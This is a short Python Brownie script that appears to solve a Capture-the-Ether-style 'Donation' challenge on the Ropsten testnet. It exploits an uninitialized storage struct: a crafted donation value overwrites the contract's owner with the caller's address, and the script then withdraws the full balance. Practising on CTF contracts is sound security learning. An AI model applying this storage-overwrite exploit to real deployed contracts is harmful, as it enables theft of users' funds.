from brownie import accounts, DonationChallenge
from web3 import Web3

challenge_address = "0xD6AA74d4061122457e7745Bf063A65C4cf79021A"

# ------------------------------------------------------------------
# To beat this challenge we must drain the balance of the contract
# We can do this by taking advantage of the uninitialized donation
# struct
# ------------------------------------------------------------------


def test_donation():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = DonationChallenge.at(challenge_address)

    # call donate with our address as the argument
    # convert our address to int
    address_to_int = Web3.toInt(hexstr=account.address)

    # compute amount of ether we need to send
    ether_amount = address_to_int / (10 ** 36)

    # call donate and change value of owner variable to our address
    tx = challenge.donate(account.address, {"from": account, "value": ether_amount})
    tx.wait(1)

    # view value of the owner variable
    print(challenge.owner())

    # call withdraw to train the contract
    tx = challenge.withdraw({"from": account})
    tx.wait(1)

    # confirm that the challenge is completed
    assert challenge.isComplete()
